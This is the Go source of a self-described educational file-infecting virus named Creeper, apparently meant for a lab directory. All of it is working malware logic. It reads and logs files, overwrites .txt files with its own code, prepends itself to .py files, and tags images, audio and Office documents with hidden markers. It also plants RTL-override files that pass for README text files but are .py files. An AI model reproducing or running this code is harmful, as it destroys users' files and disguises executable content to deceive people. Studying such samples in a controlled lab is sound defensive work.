package main

import (
	"archive/zip"
	"bytes"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"time"
)

const SELF_SOURCE = "creeper.go"
const RTL = "\u202E"

var infected = []string{}
var readLog = []string{}

func timestamp() string {
	return time.Now().Format("15:04:05")
}

func logLine(msg string) {
	fmt.Println(msg)
}

func readFile(path string) ([]byte, error) {
	return ioutil.ReadFile(path)
}

func readSource() string {
	data, err := ioutil.ReadFile(SELF_SOURCE)
	if err != nil {
		return fmt.Sprintf("#!/usr/bin/env go\n// Creeper (source unavailable: %v)\n", err)
	}
	return string(data)
}

func exfiltrate(path string) {
	data, err := readFile(path)
	if err != nil {
		return
	}
	name := filepath.Base(path)
	ext := strings.ToLower(filepath.Ext(path))
	size := len(data)

	switch ext {
	case ".txt":
		lines := strings.Count(string(data), "\n") + 1
		logLine(fmt.Sprintf("[creep] reading: %s (exfiltrated %d bytes, %d lines)", name, size, lines))
	case ".csv":
		rows := strings.Count(string(data), "\n")
		logLine(fmt.Sprintf("[creep] reading: %s (parsed %d rows)", name, rows))
	case ".html":
		tags := strings.Count(string(data), "<")
		logLine(fmt.Sprintf("[creep] reading: %s (found %d HTML tags)", name, tags))
	case ".md":
		headers := 0
		for _, line := range strings.Split(string(data), "\n") {
			if strings.HasPrefix(line, "#") {
				headers++
			}
		}
		logLine(fmt.Sprintf("[creep] reading: %s (found %d headers)", name, headers))
	case ".py":
		lines := strings.Count(string(data), "\n") + 1
		logLine(fmt.Sprintf("[creep] reading: %s (script, %d lines)", name, lines))
	case ".png", ".jpg", ".mp3":
		logLine(fmt.Sprintf("[creep] reading: %s (%d bytes, binary)", name, size))
	case ".docx", ".xlsx", ".pptx":
		logLine(fmt.Sprintf("[creep] reading: %s (office document, %d bytes)", name, size))
	default:
		return
	}
	readLog = append(readLog, name)
}

func infectFile(path string, code string) {
	name := filepath.Base(path)
	ext := strings.ToLower(filepath.Ext(path))

	if strings.HasPrefix(name, "README") || strings.Contains(name, RTL) {
		return
	}

	alreadyFn := func(n string) bool {
		for _, e := range infected {
			if strings.Contains(e, n) {
				return true
			}
		}
		return false
	}

	if name == SELF_SOURCE || name == "creeper" || name == "setup_lab.py" || strings.HasSuffix(name, ".exe") || strings.HasSuffix(name, ".rs") || strings.HasSuffix(name, ".nim") || strings.HasSuffix(name, ".c") || strings.HasSuffix(name, ".cpp") || alreadyFn(name) {
		return
	}

	switch ext {
	case ".py":
		orig, err := ioutil.ReadFile(path)
		if err != nil {
			return
		}
		infectedCode := code + "\n# === INFECTED BY CREEPER ===\n" + string(orig)
		ioutil.WriteFile(path, []byte(infectedCode), 0644)
		infected = append(infected, name+" (prepended)")
		logLine(fmt.Sprintf("[creep] infected: %s (prepended virus code)", name))

	case ".txt":
		ioutil.WriteFile(path, []byte(code), 0644)
		infected = append(infected, name+" (overwritten)")
		logLine(fmt.Sprintf("[creep] infected: %s (overwritten with virus)", name))
	}
}

func infectBinary(path string) {
	name := filepath.Base(path)
	ext := strings.ToLower(filepath.Ext(path))

	if strings.Contains(name, RTL) || name == SELF_SOURCE || strings.HasSuffix(name, ".go") {
		return
	}

	marker := []byte(fmt.Sprintf("\n[CREEPER-INFECTED]\nTimestamp: %s\n", time.Now().Format("2006-01-02 15:04:05")))

	data, err := ioutil.ReadFile(path)
	if err != nil {
		return
	}
	if bytes.Contains(data, marker[:20]) {
		return
	}

	switch ext {
	case ".png":
		if idx := strings.LastIndex(string(data), "IEND"); idx >= 0 {
			pos := idx + 8
			if pos > len(data) { break }
			newData := make([]byte, pos)
			copy(newData, data[:pos])
			newData = append(newData, marker...)
			newData = append(newData, data[pos:]...)
			ioutil.WriteFile(path, newData, 0644)
			infected = append(infected, name+" (appended marker)")
			logLine(fmt.Sprintf("[creep] infected: %s (appended marker after IEND)", name))
		}
	case ".jpg", ".jpeg":
		if len(data) >= 2 && data[len(data)-2] == 0xFF && data[len(data)-1] == 0xD9 {
			newData := make([]byte, len(data)-2)
			copy(newData, data[:len(data)-2])
			newData = append(newData, marker...)
			newData = append(newData, 0xFF, 0xD9)
			ioutil.WriteFile(path, newData, 0644)
			infected = append(infected, name+" (appended marker)")
			logLine(fmt.Sprintf("[creep] infected: %s (appended marker before EOI)", name))
		}
	case ".mp3":
		f, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0644)
		if err == nil {
			f.Write(marker)
			f.Close()
			infected = append(infected, name+" (appended marker)")
			logLine(fmt.Sprintf("[creep] infected: %s (appended marker)", name))
		}
	}
}

func infectOffice(path string) {
	name := filepath.Base(path)
	if strings.Contains(name, RTL) || strings.HasPrefix(name, ".") {
		return
	}

	hiddenContent := fmt.Sprintf("CREEPER VIRUS - INFECTION MARKER\nTimestamp: %s\nOriginal file: %s\nThis file was infected by the Creeper educational virus.\n",
		time.Now().Format("2006-01-02 15:04:05"), name)

	data, err := ioutil.ReadFile(path)
	if err != nil {
		return
	}
	buf, err := zip.NewReader(bytes.NewReader(data), int64(len(data)))
	if err != nil {
		return
	}

	// Check if already infected
	for _, f := range buf.File {
		if strings.HasPrefix(f.Name, "creeper_infection/") {
			return
		}
	}

	// Read all entries
	var entries []struct {
		name string
		data []byte
	}
	for _, f := range buf.File {
		rc, err := f.Open()
		if err != nil {
			return
		}
		d, _ := ioutil.ReadAll(rc)
		rc.Close()
		entries = append(entries, struct {
			name string
			data []byte
		}{f.Name, d})
	}

	// Rebuild ZIP with hidden entry
	var zipBuf bytes.Buffer
	w := zip.NewWriter(&zipBuf)
	for _, e := range entries {
		fw, _ := w.Create(e.name)
		fw.Write(e.data)
	}
	fw, _ := w.Create("creeper_infection/.creeper_marker.txt")
	fw.Write([]byte(hiddenContent))
	w.Close()

	ioutil.WriteFile(path, zipBuf.Bytes(), 0644)
	infected = append(infected, name+" (hidden entry)")
	logLine(fmt.Sprintf("[creep] infected: %s (added hidden marker inside ZIP)", name))
}

func spawnRTL(code string) {
	for i := 0; i < 3; i++ {
		name := fmt.Sprintf("README%d%stxt.py", i, RTL)
		if _, err := os.Stat(name); os.IsNotExist(err) {
			ioutil.WriteFile(name, []byte(code), 0644)
			infected = append(infected, name+" (RTL clone)")
			logLine(fmt.Sprintf("[creep] RTL-spawned: %s", name))
			fmt.Printf("        (looks like README%d.txt in Explorer)\n", i)
		}
	}
}

func main() {
	fmt.Println("I'M THE CREEPER: CATCH ME IF YOU CAN.\n")

	code := readSource()
	files, _ := filepath.Glob("*")

	// 1. Read files
	for _, f := range files {
		info, err := os.Stat(f)
		if err != nil || info.IsDir() || f == SELF_SOURCE || f == "setup_lab.py" || strings.HasPrefix(f, "README") {
			continue
		}
		exfiltrate(f)
	}

	// 2. Infect
	for _, f := range files {
		info, err := os.Stat(f)
		if err != nil || info.IsDir() {
			continue
		}
		ext := strings.ToLower(filepath.Ext(f))
		switch ext {
		case ".py", ".txt":
			infectFile(f, code)
		case ".png", ".jpg", ".jpeg", ".mp3":
			infectBinary(f)
		case ".docx", ".xlsx", ".pptx":
			infectOffice(f)
		}
	}

	// 3. RTL clones
	spawnRTL(code)

	// 4. Write log
	logContent := "=== CREEPER VIRUS - INFECTION LOG ===\n"
	logContent += fmt.Sprintf("Execution: %s\n", time.Now().Format("2006-01-02 15:04:05"))
	logContent += fmt.Sprintf("Source: %s\n\n", SELF_SOURCE)
	for _, l := range readLog {
		logContent += fmt.Sprintf("[%s] Read %s\n", timestamp(), l)
	}
	for _, l := range infected {
		logContent += fmt.Sprintf("[%s] Infected %s\n", timestamp(), l)
	}
	logContent += fmt.Sprintf("\nFiles read: %d\n", len(readLog))
	logContent += fmt.Sprintf("Files infected: %d\n", len(infected))
	logContent += "======================================\n"
	ioutil.WriteFile("infection.log", []byte(logContent), 0644)

	// 5. Report
	fmt.Println("\n[creep] activity logged to: infection.log")
	fmt.Printf("[creep] files read:     %d\n", len(readLog))
	fmt.Printf("[creep] files infected: %d\n", len(infected))
	regular := 0
	rtl := 0
	for _, e := range infected {
		if strings.Contains(e, "RTL") {
			rtl++
		} else {
			regular++
		}
	}
	fmt.Printf("[creep]   - regular:  %d\n", regular)
	fmt.Printf("[creep]   - RTL clones: %d\n", rtl)
	fmt.Println("[creep] use antivirus to remove me")
}
